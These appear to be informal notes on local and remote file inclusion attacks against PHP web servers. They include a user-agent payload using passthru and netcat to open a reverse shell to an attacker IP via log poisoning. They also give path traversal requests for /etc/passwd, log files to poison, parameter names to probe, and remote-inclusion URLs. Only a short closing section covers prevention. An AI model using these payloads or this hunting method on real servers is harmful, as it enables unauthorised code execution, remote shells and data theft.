LOCAL FILE INCLUSION
	>>Allows an attacker to read any file on the same server.Access file outside www directory
	>>Modify user-agent with the following code <?passthru("nc -a /bin/sh 10.2.3.18 8001");?>
	>>Try to inject code into readable files
         Ex: /proc/self/environ
             /var/log/auth.log
             /var/log/apache2/access.log

ssh random@10.2.3.19
If it get stored in log file ,you can exploit it
The file get stored to log file and you just have to upload the file.Now go to browser and just press enter.You receive a connection

REMOTE FILE INCLUSIOM
	>>Similar to local file inclusion.But allows an attacker to read any file from any server.Execute php files from other servers on the current server.Store php files on other servers at .txt
	>>nano /etc/php5/cgi/php.ini

That's the location where php configuration is stored
          allow_url_fopen=On
          allow_url_include=On
/etc/init.d/apache2 restart


#Impact of File Inclusion
	>>Code Execution on server
	>>Code Execution on client side
	>>DOS Attack
	>>Information disclosure

#Possible Parameters
file	document	folder		root	path	pg		style	pdf		template	php_path	doc

dest	redirect	uri		path	continue	url		window		next	data	reference	site
html	val		validate	domain		callback	return		page	feed	host	port	to
out		view	sir		show	navigation		open


LFI vs RFI
LOCAL FILE INCLUSION
	>>If target web server is reside on linux platform server path will be /var/www/html
					any.com/index.php?file=trump.jpg

system configuration file in root directory       /.bashrc

any.com/index.php?file=../../../etc/passwd


REMOTE FILE INCLUSION
any.com/index.php?file=http://remoteweb.com/trump.jpg


Hint :What if target ssserver will be windows based then
               C:\boot.ini

LFI Hunting Methodology
 You have to find a paramter that include some local file 
 Search for parameters like file,folder  try with /etc/passwd

RFI Hunting methodology
 Find any parameter that will load content of any website

TOOLS used for file inclusion  
	>>LFISuite

How to prevent RFI
	>>Disable allow_url_fopen
	>>Disable allow_url_include

Prevent local file inclusion 
     Use static file inclusion
